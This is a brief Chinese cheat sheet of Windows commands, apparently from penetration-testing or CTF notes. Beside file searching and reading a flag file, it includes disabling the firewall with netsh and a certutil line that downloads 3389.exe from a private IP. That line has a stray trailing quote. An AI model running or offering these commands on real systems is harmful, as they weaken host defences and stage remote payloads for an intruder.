# 5、操作系统安全基础

## 搜索文件

```
dir /s C:\ /b | findstr "Files.aspx"
```
批量查找文件

```
for /r c:\game %i in (xxxx.txt) do @echo %i
```

## windows命令查看文件

```
type C:\\flag.txt
```
## 关闭防火墙

```
netsh firewall set opmode mode=disable
```

## 下载文件(windows2008)

```
certutil -urlcache -f -split http://172.18.0.24/3389.exe";
```

